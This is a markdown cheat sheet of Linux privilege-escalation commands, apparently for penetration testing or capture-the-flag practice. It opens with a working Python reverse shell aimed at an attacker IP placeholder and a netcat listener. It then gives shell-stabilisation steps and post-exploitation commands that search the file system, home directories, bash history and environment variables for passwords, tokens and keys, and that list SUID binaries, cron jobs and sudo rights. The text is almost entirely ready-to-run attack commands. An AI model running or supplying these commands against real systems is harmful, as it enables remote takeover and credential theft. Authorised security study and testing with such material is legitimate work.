# BASIC PRIVILEGE ESCALATION ENUMERATION & EXPLOITATION
This document contains a list of useful commands for privilege escalation in Unix-like operating systems. These commands can help identify potential vectors for escalating privileges on a system. Most of them should be exploitable with the help of [GTFOBins](https://gtfobins.github.io/).

## Python Reverse Shell & Netcat Listener
It connects a compromised machine to an attacker's IP for remote command execution, while a Netcat listener waits on a specified port to receive incoming connections from such reverse shells.
#### Python TTY Reverse Shell
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.x.y",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'
```
#### Netcat listener
```
nc -nvlp 4444
```

## Upgrading to a TTY Shell
A TTY (teletypewriter) shell is a command-line interface that allows users to interact with the operating system through a terminal, enabling input and output of text commands and responses in a real-time, interactive session. It simulates the behavior of traditional teletypes, providing a way to execute commands and scripts in a Unix-like environment. There are a total 3 steps to spawning a successful TTY Shell:
- STEP-1: Run the below command to spawn a better-featured pretty-looking bash shell without tab autocomplete or the arrow keys.
```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
- STEP-2: Run the below command to set or modify the PATH environment variable in a Unix-like OS.
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp
```
- STEP-3: Run the below command to access term commands such as `clear`.
```
export TERM=xterm-256color
```
- STEP-4: Background the Session using the SHORTCUT: `CTRL + Z`.
- STEP-5: Run the below command to turn off the terminal echo (allowing tab autocompletes, arrow keys, and Ctrl + C process killing).
```
stty raw -echo; fg; reset
```
- STEP-6: (Optional) Run the below command to Set the terminal size to 200*200 for better readability.
```
stty columns 200 rows 200
```
---
#### Here is a Semi-combined Command
```
python3 -c 'import pty;pty.spawn("/bin/bash")' && export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp && export TERM=xterm-256color
```
---
## BASIC POST-EXPLOITATION ENUMERATION COMMANDS

### Finding Secret Files
- Searching for files containing sensitive information such as API keys, tokens, or passwords. It lists files based on specific keywords often associated with sensitive data.
```
find / -type f -exec ls -lsha {} + | grep -E -i '.secret|secret|token|key|api|password|username|db_password|mysql_password|mysql_user|databasepassword|mysql_root_password|mysql_password|credentials|creds|pass'
```

### Finding SUID Files
- Finding the files with SUID (Set User ID) execution permissions of the file Owner which could be used to escalate privileges.
```
find / -perm -4000 -type f 2>/dev/null
```

### Finding SGID Files
- Finding the files with SGID (Set Group ID) execution permissions of the file Owner's group which could be used to escalate privileges.
```
find / -perm -2000 -type f 2>/dev/null
```

### Finding Capabilities of Files
- Recursively listing the capabilities of all files on the root file system, suppressing error messages.
```
getcap -r / 2>/dev/null
```

### Checking Permissions on /etc/passwd & /etc/shadow
- This command checks the permissions of the /etc/passwd file, which may be writable and could allow unauthorized modifications.
```
ls -la /etc/passwd && ls -la /etc/shadow
```

### Listing Scheduled Cron Jobs
- Viewing cron jobs can reveal scheduled tasks that may be leveraged for privilege escalation.
```
cat /etc/crontab && ls /etc/cron.* && crontab -l && ls /var/spool/cron/crontabs
```

### Searching for Passwords in Home Directory
- Searches for occurrences of the term "password" recursively within the /home directory, which may help locate files containing sensitive information.
```
cd /home && grep -rnH "password"
```

### Checking Sudo Permissions
- Finding out what SUDO privileges the current has (If any):
```
sudo -l
```

### Environment Variables
- This command lists all environment variables, which can sometimes include sensitive information like passwords.
```
env
```

### Accessing User's Bash History
- The following command displays the contents of the `.bash_history` file, which may contain sensitive information such as passwords that were previously entered in the terminal.
```
cat .bash_history
```

### Checking User and Host Information
- Checking user and group details can provide insight into potential privilege escalation opportunities.
```
whoami && id && hostname
```

### Finding Writable Files and Directories
- Identifying files and directories writable by the user can help in various privilege escalation scenarios.

Writable Files
```
find / -writable -type f 2>/dev/null
```
Writable Directories
```
find / -writable -type d 2>/dev/null
```

### Finding Executables in PATH
- Finding executables in the PATH environment variable can help identify potentially exploitable scripts or binaries.
```
echo $PATH | tr ':' '\n' | xargs -I {} find {} -type f -executable 2>/dev/null
```

Feel free to modify or expand upon this template based on your needs. If you have any specific commands or sections you’d like to add, let me know!
